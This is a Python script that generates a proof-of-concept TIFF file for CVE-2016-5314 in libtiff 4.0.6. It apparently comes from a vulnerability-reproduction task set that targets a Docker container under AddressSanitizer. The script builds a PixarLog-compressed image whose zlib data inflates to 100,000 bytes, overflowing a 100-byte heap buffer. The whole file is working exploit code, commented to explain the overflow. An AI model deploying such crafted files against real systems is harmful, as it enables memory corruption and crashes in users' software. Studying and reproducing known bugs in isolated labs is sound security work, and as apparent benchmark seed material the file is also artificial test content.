import struct
import zlib
import os

def build_poc():
    # Little-endian TIFF header, Magic 42, IFD offset at byte 8
    header = b"II\x2a\x00\x08\x00\x00\x00"
    
    # IFD Entries
    # Format: tag(2), type(2), count(4), value or offset(4)
    entries = [
        (256, 3, 1, 10),            # ImageWidth: 10
        (257, 3, 1, 10),            # ImageLength: 10
        (258, 3, 1, 8),             # BitsPerSample: 8
        (259, 3, 1, 32909),         # Compression: PIXARLOG (Trigger!)
        (262, 3, 1, 1),             # PhotometricInterpretation: BlackIsZero
        (273, 4, 1, 110),           # StripOffsets: byte offset where zlib stream begins
        (277, 3, 1, 1),             # SamplesPerPixel: 1
        (278, 3, 1, 10),            # RowsPerStrip: 10
        (279, 4, 1, 999999)         # StripByteCounts: Arbitrary Large
    ] # Total entries: 9. IFD size = 2 + (9 * 12) + 4 = 114 bytes
    
    # StripOffsets needs to be adjusted. 
    # Header is 8 bytes. IFD size is 114 bytes.
    # Total metadata length = 122 bytes. So StripOffsets = 122.
    entries[5] = (273, 4, 1, 122)
    
    ifd = struct.pack("<H", len(entries))
    for tag, dtype, count, val in entries:
        ifd += struct.pack("<HHII", tag, dtype, count, val)
    ifd += struct.pack("<I", 0) # Pointer to next IFD (0 = end)
    
    # The vulnerability:
    # tbuf_size = Width * Height * SamplesPerPixel * (BitsPerSample / 8)
    # tbuf_size = 10 * 10 * 1 * 1 = 100 bytes heap allocation.
    
    # We create a zlib payload that inflates to 100,000 bytes!
    # zlib's inflate() in vulnerable libtiff 4.0.6 will blindly write all 100,000 bytes 
    # into the 100 byte heap buffer without bounds checking.
    raw_uncompressed_attack = b"A" * 100000 
    zlib_payload = zlib.compress(raw_uncompressed_attack)
    
    return header + ifd + zlib_payload

output_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "tasks", "CVE-2016-5314_libtiff", "seeds", "poc.tiff"))

with open(output_path, "wb") as f:
    f.write(build_poc())
    
print(f"PoC written to {output_path}")
print("Run this on Kali against the target-vuln docker container to verify the ASan heap-buffer-overflow!")
